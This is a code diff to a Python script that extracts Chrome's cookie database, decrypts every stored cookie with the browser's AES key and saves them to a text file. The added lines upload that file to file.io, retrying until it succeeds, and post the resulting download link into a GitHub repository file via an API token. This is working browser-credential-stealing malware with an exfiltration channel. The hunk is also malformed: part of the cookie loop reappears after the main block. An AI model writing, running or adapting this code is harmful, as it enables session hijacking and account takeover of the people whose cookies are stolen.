@@ -27,13 +27,56 @@ def get_key(key_path):
 
 def harvest():
     paths = find_chrome_files()
-    if not paths["key_path"] or not paths["db_path"]: return None
+    if not paths["key_path"] or not paths["db_path"]: 
+        return None
     key = get_key(paths["key_path"])
-    if not key: return None
+    if not key: 
+        return None
     shutil.copyfile(paths["db_path"], "temp_db")
     conn = sqlite3.connect("temp_db")
     cursor = conn.cursor()
     cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+    cookies_text = ""
+    for host, name, enc_val in cursor.fetchall():
+        try:
+            iv, payload = enc_val[3:15], enc_val[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            val = cipher.decrypt(payload)[:-16].decode()
+            cookies_text += f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{val}\n"
+        except: 
+            continue
+    conn.close()
+    if os.path.exists("temp_db"): 
+        os.remove("temp_db")
+    with open("my_cookies.txt", "w", encoding="utf-8") as f:
+        f.write(cookies_text)
+    return "my_cookies.txt"
+
+def update_github(link):
+    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+    try:
+        res = requests.get(url, headers=headers).json()
+        sha = res["sha"]
+        data = {"status": "Success", "download_link": link, "time": time.ctime()}
+        content = base64.b64encode(json.dumps(data, indent=4).encode()).decode()
+        requests.put(url, headers=headers, json={"message": "New Link", "content": content, "sha": sha})
+    except:
+        pass
+
+if __name__ == "__main__":
+    file_name = harvest()
+    if file_name:
+        while True:
+            try:
+                with open(file_name, "rb") as f:
+                    response = requests.post("https://file.io", files={"file": f})
+                if response.status_code == 200:
+                    update_github(response.json().get("link"))
+                    os.remove(file_name)
+                    break
+            except:
+                time.sleep(60)
     cookies_text = ""
     for host, name, enc_val in cursor.fetchall():
         try:
